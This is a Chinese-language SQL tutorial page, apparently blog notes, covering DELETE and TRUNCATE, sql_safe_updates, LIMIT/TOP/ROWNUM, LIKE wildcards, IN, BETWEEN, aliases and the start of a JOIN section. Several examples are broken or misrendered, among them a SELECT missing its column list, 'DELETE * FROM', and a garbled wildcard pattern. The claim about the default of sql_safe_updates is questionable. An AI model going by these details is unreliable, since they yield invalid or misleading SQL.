<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>

<p>删除表test里的内容，并释放空间，但不删除表的定义，表的结构还在。</p>
<p><strong>DELETE:</strong></p>
<p>1、删除指定数据</p>
<p>删除表test中年龄等于30的且国家为US的数据</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE <span class="keyword">FROM</span> test WHERE <span class="attribute">age</span>=30 <span class="keyword">AND</span> <span class="attribute">country</span>=<span class="string">'US'</span>;</span><br></pre></td></tr></table></figure>

<p>2、删除整个表</p>
<p>仅删除表test内的所有内容，保留表的定义，不释放空间。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">test</span> 或者 <span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">DELETE</span> * <span class="keyword">FROM</span> <span class="keyword">test</span> 或者 <span class="keyword">DELETE</span> * <span class="keyword">FROM</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>

<p>mysql 中可以通过参数 sql_safe_updates 来限制 update/delete，防止全表更新或删除。</p>
<p>以下 3 种情况在采用此参数的情况下都不能正常进行操作：</p>
<ul>
<li>1: 没有加where条件的全表更新操作;</li>
<li>2: 加了 where 条件字段，但是 where 字段没有走索引的表更新;</li>
<li>3: 全表 delete 没有加 where 条件或者 where 条件没有走索引。</li>
</ul>
<p>这三种情况下都会抛出异常，无法执行。</p>
<p>下面是 sql_safe_updates 变量为 0 和 1 时的取值说明：</p>
<p>sql_safe_updates 有两个取值 0 和 1， 即 off 和 on。</p>
<p>sql_safe_updates = 1 (或 sql_safe_updates = on ) 时，不带 where 和 limit 条件的 update 和 delete 操作语句是无法执行的，即使是有 where 和 limit 条件但不带 key column 限制条件的 update 和 delete 也不能执行。</p>
<p>sql_safe_updates = 0 (或 sql_safe_updates = off ) 时，无 where 和 limit 条件的 update 和 delete 操作将会顺利执行。</p>
<p>很显然，在一般的 mysql 中此参数的默认值是 1。</p>
<p>在 sql_safe_updates = on 时，采取删除或更新全表时抛出的错误码为 1175。</p>
<h4 id="SQL-SELECT-TOP-LIMIT-ROWNUM-子句"><a href="#SQL-SELECT-TOP-LIMIT-ROWNUM-子句" class="headerlink" title="SQL SELECT TOP, LIMIT, ROWNUM 子句"></a>SQL SELECT TOP, LIMIT, ROWNUM 子句</h4><p>SELECT TOP 子句用于规定要返回的记录的数目。</p>
<p>SELECT TOP 子句对于拥有数千条记录的大型表来说，是非常有用的。</p>
<p><strong>注意:</strong>并非所有的数据库系统都支持 SELECT TOP 语句。 MySQL 支持 LIMIT 语句来选取指定的条数数据， Oracle 可以使用 ROWNUM 来选取。</p>
<p>SQL Server / MS Access 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="built_in">number</span>|<span class="keyword">percent</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>MySQL 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="keyword">number</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>Oracle 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;= <span class="built_in">number</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line"><span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;=<span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>MySQL SELECT LIMIT 实例</p>
<p>下面的 SQL 语句从 “Websites” 表中选取头两条记录：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">LIMIT</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>SQL SELECT TOP PERCENT 实例</p>
<p>在 Microsoft SQL Server 中还可以使用百分比作为参数。</p>
<p>下面的 SQL 语句从 websites 表中选取前面百分之 50 的记录：</p>
<p>实例</p>
<p>以下操作在 Microsoft SQL Server 数据库中可执行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">50</span> <span class="keyword">PERCENT</span> * <span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>变相返回后 N 行:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--前5行</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">5</span> * <span class="keyword">from</span> <span class="keyword">table</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--后5行</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">5</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">desc</span>  <span class="comment">--desc 表示降序排列 asc 表示升序</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-LIKE-操作符"><a href="#SQL-LIKE-操作符" class="headerlink" title="SQL LIKE 操作符"></a>SQL LIKE 操作符</h4><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p>
<h4 id="SQL-LIKE-语法"><a href="#SQL-LIKE-语法" class="headerlink" title="SQL LIKE 语法"></a>SQL LIKE 语法</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> pattern;</span><br></pre></td></tr></table></figure>

<p>SQL LIKE 操作符实例</p>
<p>下面的 SQL 语句选取 name 以字母 “G” 开始的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'G%'</span>;</span><br></pre></td></tr></table></figure>

<p>下面的 SQL 语句选取 name 包含模式 “oo” 的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'%oo%'</span>;</span><br></pre></td></tr></table></figure>

<p>通过使用 NOT 关键字，您可以选取不匹配模式的记录。</p>
<p>下面的 SQL 语句选取 name 不包含模式 “oo” 的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">'%oo%'</span>;</span><br></pre></td></tr></table></figure>

<p>example:</p>
<p>‘%a’    //以a结尾的数据</p>
<p>‘a%’    //以a开头的数据</p>
<p>‘%a%’    //含有a的数据</p>
<p>‘<em>a</em>’    //三位且中间字母是a的</p>
<p>‘_a’    //两位且结尾字母是a的</p>
<p>‘a_’    //两位且开头字母是a的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> username <span class="keyword">where</span> 用户名 <span class="keyword">like</span> <span class="string">'段_%'</span>    <span class="comment">-- 会查出来段煜 段鑫</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> username <span class="keyword">where</span> 用户名 <span class="keyword">like</span> <span class="string">'段\_%'</span> escape <span class="string">'\'   -- 通过 \转义,只能查出来 段_煜</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-通配符"><a href="#SQL-通配符" class="headerlink" title="SQL 通配符"></a>SQL 通配符</h4><p>在 SQL 中，通配符与 SQL LIKE 操作符一起使用。</p>
<p>SQL 通配符用于搜索表中的数据。</p>
<p>在 SQL 中，可使用以下通配符：</p>
<table>
<thead>
<tr>
<th align="left">通配符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%</td>
<td align="left">替代 0 个或多个字符</td>
</tr>
<tr>
<td align="left">_</td>
<td align="left">替代一个字符</td>
</tr>
<tr>
<td align="left">[<em>charlist</em>]</td>
<td align="left">字符列中的任何单一字符</td>
</tr>
<tr>
<td align="left">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td>
<td align="left">不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
<p>使用 SQL % 通配符</p>
<p>下面的 SQL 语句选取 url 以字母 “https” 开始的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> <span class="keyword">url</span> <span class="keyword">LIKE</span> <span class="string">'https%'</span>;</span><br></pre></td></tr></table></figure>

<p>使用 SQL _ 通配符</p>
<p>下面的 SQL 语句选取 name 以一个任意字符开始，然后是 “oogle” 的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'_oogle'</span>;</span><br></pre></td></tr></table></figure>

<p>使用 SQL [charlist] 通配符</p>
<p>MySQL 中使用 <strong>REGEXP</strong> 或 <strong>NOT REGEXP</strong> 运算符 (或 RLIKE 和 NOT RLIKE) 来操作正则表达式。</p>
<p>下面的 SQL 语句选取 name 以 “G”、”F” 或 “s” 开始的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">'^[GFs]'</span>;</span><br></pre></td></tr></table></figure>

<p>下面的 SQL 语句选取 name 以 A 到 H 字母开头的网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">'^[A-H]'</span>;</span><br></pre></td></tr></table></figure>

<p>下面的 SQL 语句选取 name 不以 A 到 H 字母开头的网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">'^[^A-H]'</span>;</span><br></pre></td></tr></table></figure>

<p>LIKE命令都涉及到的通配符：</p>
<p>% 替代一个或多个字符</p>
<p>_ 仅替代一个字符</p>
<p>[charlist] 字符列中的任何单一字符</p>
<p>[^charlist]或者[!charlist] 不在字符列中的任何单一字符</p>
<p>MySQL 和 SQLite 会把 <strong>like ‘[xxx]yyy’</strong> 的中括号当成普通字符，而不是通配符。</p>
<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> persons <span class="keyword">WHERE</span> City <span class="keyword">LIKE</span> <span class="string">'[b]eijing'</span></span><br></pre></td></tr></table></figure>

<p>将查出 <strong>city</strong> 为 <strong>[B]eijing</strong> 的行，而不是 <strong>city</strong> 为 <strong>beijing</strong> 的行。</p>
<p>MySQL 中要完成 <strong>[^charlist]</strong> 或 <strong>[!charlist]</strong> 通配符的查询效果，需要通过正则表达式来完成。</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> persons <span class="keyword">WHERE</span> City REGEXP <span class="string">'[b]eijing'</span></span><br></pre></td></tr></table></figure>

<p>SQLite不支持Regexp正则方法。</p>
<h4 id="SQL-IN-操作符"><a href="#SQL-IN-操作符" class="headerlink" title="SQL IN 操作符"></a>SQL IN 操作符</h4><p>SQL IN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1,value2,...);</span><br></pre></td></tr></table></figure>

<p>IN 操作符实例</p>
<p>下面的 SQL 语句选取 name 为 “Google” 或 “菜鸟教程” 的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">IN</span> (<span class="string">'Google'</span>,<span class="string">'菜鸟教程'</span>);</span><br></pre></td></tr></table></figure>

<p><strong>IN 与 = 的异同</strong></p>
<ul>
<li>相同点：均在WHERE中使用作为筛选条件之一、均是等于的含义</li>
<li>不同点：IN可以规定多个值，等于规定一个值</li>
</ul>
<p>in 与 = 的转换**</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Websites <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">in</span> (<span class="string">'Google'</span>,<span class="string">'菜鸟教程'</span>);</span><br></pre></td></tr></table></figure>

<p>可以转换成 <strong>=</strong> 的表达：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Websites <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'Google'</span> <span class="keyword">or</span> <span class="keyword">name</span>=<span class="string">'菜鸟教程'</span>;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-BETWEEN-操作符"><a href="#SQL-BETWEEN-操作符" class="headerlink" title="SQL BETWEEN 操作符"></a>SQL BETWEEN 操作符</h4><p>BETWEEN 操作符选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。</p>
<p>SQL BETWEEN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2;</span><br></pre></td></tr></table></figure>

<p>BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 alexa 介于 1 和 20 之间的所有网站：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> alexa <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>

<p>NOT BETWEEN 操作符实例</p>
<p>如需显示不在上面实例范围内的网站，请使用 NOT BETWEEN：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> alexa <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>

<p>带有 IN 的 BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 alexa 介于 1 和 20 之间但 country 不为 USA 和 IND 的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> (alexa <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>)</span><br><span class="line"><span class="keyword">AND</span> country <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">'USA'</span>, <span class="string">'IND'</span>);</span><br></pre></td></tr></table></figure>

<p>带有文本值的 BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 name 以介于 ‘A’ 和 ‘H’ 之间字母<strong>开始</strong>的所有网站：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">BETWEEN</span> <span class="string">'A'</span> <span class="keyword">AND</span> <span class="string">'H'</span>;</span><br></pre></td></tr></table></figure>

<p>带有日期值的 BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 date 介于 ‘2016-05-10’ 和 ‘2016-05-14’ 之间的所有访问记录：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> access_log</span><br><span class="line"><span class="keyword">WHERE</span> <span class="built_in">date</span> <span class="keyword">BETWEEN</span> <span class="string">'2016-05-10'</span> <span class="keyword">AND</span> <span class="string">'2016-05-14'</span>;</span><br></pre></td></tr></table></figure>

<p>请注意，在不同的数据库中，BETWEEN 操作符会产生不同的结果！</p>
<p>在某些数据库中，BETWEEN 选取介于两个值之间但不包括两个测试值的字段。<br>在某些数据库中，BETWEEN 选取介于两个值之间且包括两个测试值的字段。<br>在某些数据库中，BETWEEN 选取介于两个值之间且包括第一个测试值但不包括最后一个测试值的字段。</p>
<p>因此，请检查您的数据库是如何处理 BETWEEN 操作符</p>
<h4 id="SQL-别名"><a href="#SQL-别名" class="headerlink" title="SQL 别名"></a>SQL 别名</h4><p>通过使用 SQL，可以为表名称或列名称指定别名。</p>
<p>基本上，创建别名是为了让列名称的可读性更强。</p>
<p>列的 SQL 别名语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">AS</span> alias_name</span><br><span class="line"><span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>表的 SQL 别名语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name <span class="keyword">AS</span> alias_name;</span><br></pre></td></tr></table></figure>

<p>列的别名实例</p>
<p>下面的 SQL 语句指定了两个别名，一个是 name 列的别名，一个是 country 列的别名。<strong>提示：</strong>如果列名称包含空格，要求使用双引号或方括号：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">AS</span> n, country <span class="keyword">AS</span> c</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>在下面的 SQL 语句中，我们把三个列（url、alexa 和 country）结合在一起，并创建一个名为 “site_info” 的别名：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, <span class="keyword">CONCAT</span>(<span class="keyword">url</span>, <span class="string">', '</span>, alexa, <span class="string">', '</span>, country) <span class="keyword">AS</span> site_info</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>表的别名实例</p>
<p>下面的 SQL 语句选取 “菜鸟教程” 的访问记录。我们使用 “Websites” 和 “access_log” 表，并分别为它们指定表别名 “w” 和 “a”（通过使用别名让 SQL 更简短）：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> w.name, w.url, a.<span class="built_in">count</span>, a.date </span><br><span class="line"><span class="keyword">FROM</span> Websites <span class="keyword">AS</span> w, access_log <span class="keyword">AS</span> a </span><br><span class="line"><span class="keyword">WHERE</span> a.site_id=w.id <span class="keyword">and</span> w.name=<span class="string">"菜鸟教程"</span>;</span><br></pre></td></tr></table></figure>

<p>不带别名的相同的 SQL 语句：</p>
<p>实例</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SELECT</span> Websites.<span class="built_in">name</span>, Websites.url, access_log.<span class="built_in">count</span>, access_log.<span class="built_in">date</span> </span><br><span class="line"><span class="keyword">FROM</span> Websites, access_log </span><br><span class="line">WHERE Websites.id=access_log.site_id <span class="built_in">and</span> Websites.<span class="built_in">name</span>=<span class="string">"菜鸟教程"</span>;</span><br></pre></td></tr></table></figure>

<p>在下面的情况下，使用别名很有用：</p>
<ul>
<li>在查询中涉及超过一个表</li>
<li>在查询中使用了函数</li>
<li>列名称很长或者可读性差</li>
<li>需要把两个列或者多个列结合在一起</li>
</ul>
<h3 id="SQL-JOIN"><a href="#SQL-JOIN" class="headerlink" title="SQL JOIN"></a>SQL JOIN</h3><p>SQL join 用于把来自两个或多个表的行结合起来。</p>
<p>下图展示了 LEFT JOIN、RIGHT JOIN、INNER JOIN、OUTER JOIN 相关的 7 种用法。</p>
<p>![img](The First Day for Web/sql-join.png)</p>
<p>SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</p>
<p>SQL INNER JOIN</p>
<p>最常见的 JOIN 类型：<strong>SQL INNER JOIN（简单的 JOIN）</strong>。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。</p>
<p>演示数据库</p>
<p>在本教程中，我们将使用 RUNOOB 样本数据库。</p>
<p>下面是选自 “Websites” 表的数据：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string"> stackoverflow </span>|<span class="string"> http://stackoverflow.com/ </span>|<span class="string">   0 </span>|<span class="string"> IND     </span>|</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>

<p>下面是 “access_log” 网站访问记录表的数据：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM access_log;</span><br><span class="line">+-----+---------+-------+------------+</span><br><span class="line">| aid | site_id | count | date       |</span><br><span class="line">+-----+---------+-------+------------+</span><br><span class="line">|   <span class="number">1</span> |       <span class="number">1</span> |    <span class="number">45</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-10</span> |</span><br><span class="line">|   <span class="number">2</span> |       <span class="number">3</span> |   <span class="number">100</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-13</span> |</span><br><span class="line">|   <span class="number">3</span> |       <span class="number">1</span> |   <span class="number">230</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-14</span> |</span><br><span class="line">|   <span class="number">4</span> |       <span class="number">2</span> |    <span class="number">10</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-14</span> |</span><br><span class="line">|   <span class="number">5</span> |       <span class="number">5</span> |   <span class="number">205</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-14</span> |</span><br><span class="line">|   <span class="number">6</span> |       <span class="number">4</span> |    <span class="number">13</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-15</span> |</span><br><span class="line">|   <span class="number">7</span> |       <span class="number">3</span> |   <span class="number">220</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-15</span> |</span><br><span class="line">|   <span class="number">8</span> |       <span class="number">5</span> |   <span class="number">545</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-16</span> |</span><br><span class="line">|   <span class="number">9</span> |       <span class="number">3</span> |   <span class="number">201</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-17</span> |</span><br><span class="line">+-----+---------+-------+------------+</span><br><span class="line"><span class="number">9</span> rows in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>请注意，”Websites” 表中的 “<strong>id</strong>“ 列指向 “access_log” 表中的字段 “<strong>site_id</strong>“。上面这两个表是通过 “site_id” 列联系起来的。</p>
<p>然后，如果我们运行下面的 SQL 语句（包含 INNER JOIN）：</p>
